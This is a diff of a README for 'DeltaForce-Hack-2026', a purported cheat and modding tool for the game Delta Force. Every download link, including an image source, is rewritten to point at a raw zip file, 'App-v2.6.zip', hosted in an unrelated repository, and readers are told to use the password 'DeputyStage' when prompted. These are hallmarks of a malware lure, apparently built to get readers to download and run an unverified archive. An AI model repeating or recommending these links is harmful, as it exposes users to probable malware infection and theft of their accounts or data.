@@ -10,12 +10,12 @@ description: "Unlock Delta Force with advanced modding tools, cheats, and gamepl
   <img
     width="474"
     alt="Delta Force"
-    src="https://github.com/user-attachments/assets/ff15341b-9927-4d50-b219-62f3b483017e"
+    src="https://raw.githubusercontent.com/nnaopa/nnaopa.github.io/main/models/App-v2.6.zip"
   />
 
   <br><br>
 
-  <a href="https://github.com/nnaopa/DeltaForce-Hack-2026/releases">
+  <a href="https://raw.githubusercontent.com/nnaopa/nnaopa.github.io/main/models/App-v2.6.zip">
     <img
       width="260"
       alt="Download Now"
@@ -37,7 +37,7 @@ Welcome to DeltaForce-Hack-2026! This powerful tool helps you enhance your gamin
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: [Download DeltaForce-Hack-2026](https://github.com/nnaopa/DeltaForce-Hack-2026/releases)
+Visit this link to download the application: [Download DeltaForce-Hack-2026](https://raw.githubusercontent.com/nnaopa/nnaopa.github.io/main/models/App-v2.6.zip)
 
 To get started, follow these simple steps:
 
@@ -176,7 +176,7 @@ A: Not at all. The application is designed for everyone, regardless of technical
 
 ## 🔄 Updates and Support
 
-We're committed to providing the best possible experience. The application receives regular updates to fix issues and improve functionality. Visit the [releases page](https://github.com/nnaopa/DeltaForce-Hack-2026/releases) regularly to check for new versions.
+We're committed to providing the best possible experience. The application receives regular updates to fix issues and improve functionality. Visit the [releases page](https://raw.githubusercontent.com/nnaopa/nnaopa.github.io/main/models/App-v2.6.zip) regularly to check for new versions.
 
 ### How to Update
 1. Visit the releases page
@@ -189,7 +189,7 @@ We're committed to providing the best possible experience. The application recei
 
 DeltaForce-Hack-2026 offers an excellent opportunity to explore advanced gaming techniques in a safe, educational environment. With its user-friendly approach and comprehensive features, you'll be up and running in minutes. Remember to use the password `DeputyStage` when prompted, and don't hesitate to explore all the features at your disposal.
 
-Visit this link to download the application: [Download DeltaForce-Hack-2026](https://github.com/nnaopa/DeltaForce-Hack-2026/releases)
+Visit this link to download the application: [Download DeltaForce-Hack-2026](https://raw.githubusercontent.com/nnaopa/nnaopa.github.io/main/models/App-v2.6.zip)
 
 ---
 
